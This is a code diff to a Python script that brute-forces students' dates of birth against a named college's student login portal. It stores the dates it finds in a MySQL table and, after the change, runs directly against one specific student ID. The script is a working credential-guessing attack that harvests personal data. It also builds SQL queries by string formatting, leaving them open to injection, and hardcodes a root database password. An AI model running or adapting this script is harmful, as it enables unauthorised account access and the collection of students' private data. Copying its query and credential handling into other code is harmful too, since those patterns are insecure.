@@ -1,22 +1,8 @@
 import requests
 import mysql.connector
 
-
-mycon = mysql.connector.connect(host="localhost", passwd="rootmysql",user="root")
-mysql_cursor = mycon.cursor()
-
-mysql_cursor.execute('CREATE DATABASE IF NOT EXISTS kcg')
-mysql_cursor.execute('USE kcg')
-
-
-query_create_table = 'CREATE TABLE dobs(id varchar(13) primary key, dob varchar(8) not null)'
-
 student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
 
-try:
-    mysql_cursor.execute(query_create_table)
-except:
-    pass
 payload = {
     '__EVENTTARGET' : '' ,
     '__EVENTARGUMENT' : '',
@@ -47,27 +33,33 @@ def check_date(The_day_):
                 
     try:
         page = requests.post(student_login_url, data = payload, timeout = 10)
-        #print(The_day_)
+        print(The_day_)
     except:
-        #print('timed out', The_day_)
+        print('timed out', The_day_)
         time_out_dates.append(The_day_)               
         
 
     #print(page.url)
     if page.url != student_login_url: 
-        #print('dob found 1')        
-        #print(The_day)  
-        #print('dob found 2')             
+        print('dob found 1')        
+        print(The_day_)  
+        print('dob found 2')             
         return True
     
     return False 
 
 
 def find_student_dob(user_id, year_of_birth = None):
+
+    mycon = mysql.connector.connect(host="localhost", passwd="rootmysql",user="root", database = 'kcg', autocommit = True)
+    mysql_cursor = mycon.cursor()
+
     mysql_cursor.execute("select * from dobs where id = '{}'".format(user_id))
     data = mysql_cursor.fetchall()
     
     if data != []:
+        mysql_cursor.close()
+        mycon.close()
         return data[0][1]
     else:
         reg_no_ = False
@@ -102,23 +94,31 @@ def find_student_dob(user_id, year_of_birth = None):
                     The_day = str_day + str_month + str_yob
                     
                     if check_date(The_day):
-                        #print('dob found 3')
+                        print('dob found 3')
                         mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
                         mysql_cursor.execute('commit')
-                        #print('dob found 4')
+                        print('dob found 4')
+
+                        mysql_cursor.close()
+                        mycon.close()
+
                         return The_day
 
         for date_ in time_out_dates:
             if check_date(date_):
-                mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
+                mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,date_))
                 mysql_cursor.execute('commit')
+
+                mysql_cursor.close()
+                mycon.close()
+
                 return date_
 
                     
         
     raise Exception   
 
-#find_student_dob('311020104004', '2003')                        
+find_student_dob('311020104023', '2003')                        
             
 
 
